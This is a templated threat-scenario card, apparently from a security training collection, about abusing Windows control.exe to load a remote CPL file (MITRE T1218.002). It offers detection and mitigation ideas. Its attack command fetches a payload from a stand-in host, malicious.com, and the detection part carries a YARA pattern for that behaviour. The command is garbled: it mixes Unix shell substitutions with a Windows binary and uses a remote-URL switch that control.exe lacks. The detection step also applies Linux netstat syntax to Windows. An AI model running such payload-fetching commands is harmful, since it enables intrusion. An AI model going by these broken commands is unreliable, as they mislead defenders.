---
type: campaign
scenario_id: 126
tactic: Defense Evasion
technique: "T1218.002: Control Panel"
technique_id: T1218.002
tags: [campaign, lotl, defense_evasion]
---

# Using control.exe to execute malicious CPL file remotely.

## Threat Description
Using control.exe to execute malicious CPL file remotely.

## Attack Command
```
control /name $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).cpl) /remote http://malicious.com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
```

## Detection Logic
Monitor control.exe network activity: `netstat -anp | grep control`; YARA rule: `rule ControlCPLRemote { strings: $a = /control.*http/ nocase; condition: $a }`

## Mitigation
Block control.exe network access: `netsh advfirewall firewall add rule name='Block control' dir=out program='%windir%\System32\control.exe' action=block`; Use AppLocker for CPL files.

## AI Training Prompt
Train AI to detect control.exe CPL remote execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.002: https://attack.mitre.org/techniques/T1218/002/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
